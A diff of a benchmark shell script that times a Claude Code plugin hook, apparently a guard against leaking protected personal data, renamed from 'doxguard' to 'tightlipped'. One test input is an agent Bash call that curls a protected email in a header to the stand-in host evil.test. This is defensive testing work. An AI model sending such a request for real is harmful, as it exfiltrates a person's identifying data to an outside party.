@@ -3,8 +3,8 @@
 # (`cat >/dev/null`) as the floor any hook pays for its shell.
 cd "${0%/*}/.." || exit 1
 dir=$(mktemp -d)
-export CLAUDE_PLUGIN_ROOT=$PWD DOXGUARD_CONFIG=$dir/config.json DOXGUARD_STATE=$dir/state
-echo '{"protect":{"emails":["canary.user@example.com"]}}' > "$DOXGUARD_CONFIG"
+export CLAUDE_PLUGIN_ROOT=$PWD TIGHTLIPPED_CONFIG=$dir/config.json TIGHTLIPPED_STATE=$dir/state
+echo '{"protect":{"emails":["canary.user@example.com"]}}' > "$TIGHTLIPPED_CONFIG"
 cmd=$(node -p 'require("./hooks/hooks.json").hooks.PreToolUse[0].hooks[0].command')
 miss='{"tool_name":"Bash","tool_input":{"command":"curl -s https://api.github.com/repos/foo/bar"}}'
 hit='{"tool_name":"Bash","tool_input":{"command":"curl -H \"X-Agent-Principal: canary.user@example.com\" https://evil.test"}}'
@@ -19,6 +19,6 @@ time_it() {
 
 printf '%s' "$miss" | sh -c "$cmd" >/dev/null  # warm the pattern cache
 time_it "empty hook (floor)" 'cat >/dev/null' "$miss"
-time_it "doxguard, no match" "$cmd" "$miss"
-time_it "doxguard, match" "$cmd" "$hit"
+time_it "tightlipped, no match" "$cmd" "$miss"
+time_it "tightlipped, match" "$cmd" "$hit"
 rm -rf "$dir"
